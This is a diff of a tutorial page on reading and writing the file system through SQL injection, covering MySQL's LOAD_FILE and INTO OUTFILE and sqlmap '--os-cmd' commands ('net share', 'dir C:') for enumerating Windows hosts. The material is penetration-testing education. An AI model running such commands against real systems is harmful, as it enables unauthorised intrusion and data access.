@@ -31,7 +31,7 @@ description: Learn how to access the file system through SQL injection vulnerabi
         <h4>MySQL</h4>
         <ul>
           <li>Requires <code>FILE</code> privilege</li>
-          <li>Uses <code>LOAD_FILE()</code> for reading</li>
+          <li>Uses <code>LOAD_FILE</code> for reading</li>
           <li>Uses <code>INTO OUTFILE/DUMPFILE</code> for writing</li>
           <li>Limited to directories with write permissions</li>
         </ul>
@@ -305,12 +305,10 @@ description: Learn how to access the file system through SQL injection vulnerabi
     
     ```bash
     # List available shares
-    sqlmap -u "http://www.example.com/vuln.php?id=1" \
-      --os-cmd="net share"
+    sqlmap -u "http://www.example.com/vuln.php?id=1" --os-cmd="net share"
     
     # Check accessible directories
-    sqlmap -u "http://www.example.com/vuln.php?id=1" \
-      --os-cmd="dir C:\\"
+    sqlmap -u "http://www.example.com/vuln.php?id=1" --os-cmd="dir C:"
     ```
     
     <p className="mt-2">These commands help enumerate Windows-specific resources like shares and drives.</p>
